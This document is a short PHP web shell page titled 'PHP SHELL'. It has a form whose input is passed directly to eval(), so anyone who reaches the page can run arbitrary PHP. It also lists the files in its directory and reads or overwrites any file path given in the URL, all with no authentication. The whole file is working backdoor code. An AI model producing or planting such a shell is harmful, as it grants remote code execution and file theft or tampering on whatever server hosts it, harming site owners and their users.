<!DOCTYPE html>
    <head>
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <title>PHP SHELL</title>
        <style>
            table{
                width: 30%;
                border: 1px solid black;
                padding: 5px;
    
        }
        </style>
    </head>
    <body>
        <form>
            <label>Enter PHP CODE : </label>
            <input type="text" name="php_code" />
            <input type="submit" value="Execute" />
        </form>
    
<?php
    //Variables Declaration
    

    //Execute Command
    if (isset($_GET['php_code'])){
        eval($_GET['php_code']);
    }
    
    //List Files
    $files = scandir(dirname(__FILE__));
    echo"<table><tr><th colspan='2'>List of Files</th></tr>";
    for ($i=0; $i<count($files); $i++){
        echo "<tr><td><a href ='" . $files[$i] . "'>" . $files[$i] . "</a></td>";
        if (preg_match("/\...+$/", $files[$i]) && $files[$i]!= basename($_SERVER['PHP_SELF']) ){
        echo "<td><a href ='" . $_SERVER['PHP_SELF'] . "?action=edit&file=" . $files[$i] . "'>read file</a></td></tr>";
        }
        echo '<br>';
    }
    echo "</table>";
    
    //Read Files
    if (isset($_GET['action']) && isset($_GET['file'])){
        $open = fopen($_GET['file'],"r");
        $read = fread($open,  filesize($_GET['file']));
        ?>
        <form>
            <input type="text" readonly name="file_name" value="<?php echo $_GET['file'] ?>"><br>
            <textarea rows="13" cols="100" name="save_file"><?php echo $read ?></textarea><br>
            <input type="submit" name="submit" value="save">
        </form>
    <?php }
        if(isset($_GET['save_file'])){
            $open = fopen($_GET['file_name'],"w+");
            fwrite($open, $_GET['save_file']);
        }
    //modify files
        
?>
</body>
</html>